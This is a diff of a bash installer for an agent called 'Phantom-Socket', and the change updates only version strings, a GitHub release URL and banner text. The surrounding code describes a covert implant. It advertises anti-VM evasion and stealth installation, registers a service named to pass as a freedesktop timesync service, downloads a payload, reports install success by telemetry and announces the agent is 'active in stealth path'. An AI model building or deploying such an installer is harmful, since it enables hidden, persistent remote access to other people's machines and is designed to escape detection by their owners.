@@ -1,5 +1,5 @@
 #!/bin/bash
-# Phantom-Socket V1.0 - Professional Infrastructure Deployment
+# Phantom-Socket v1.0 Final - Professional Infrastructure Deployment
 # Features: Anti-VM, Jitter Heartbeat, PSK Pre-Auth (OYEN), and Stealth Installation.
 
 set -euo pipefail
@@ -7,10 +7,10 @@ set -euo pipefail
 # ============================================================================
 # Configuration
 # ============================================================================
-readonly VERSION="20.0.0"
+readonly VERSION="1.0"
 readonly AGENT_NAME="phantom-client"
 readonly SERVICE_NAME="dbus-org.freedesktop.timesync1"
-readonly BASE_URL="https://github.com/Oyen-Sec/phantom-socket/releases/download/v${VERSION}"
+readonly BASE_URL="https://github.com/Oyen-Sec/phantom-socket/releases/download/v1.0-Final"
 
 # ============================================================================
 # UI Helpers
@@ -135,16 +135,16 @@ install_and_alias() {
     status_done
     
     send_telemetry "INSTALL_SUCCESS" "${target_binary}"
-    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-    echo "[+] Installation V20.0 Complete. Agent is now active in stealth path."
+    echo "------------------------------------------------------------"
+    echo "[+] Installation v1.0 Final Complete. Agent is now active in stealth path."
     echo "[+] Path: ${target_binary}"
-    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+    echo "------------------------------------------------------------"
 }
 
 # ============================================================================
 # Main Execution
 # ============================================================================
-echo "--- Phantom-Socket V20.0 Installer ---"
+echo "--- Phantom-Socket v1.0 Final Installer ---"
 check_dependencies
 detect_environment
 download_payload
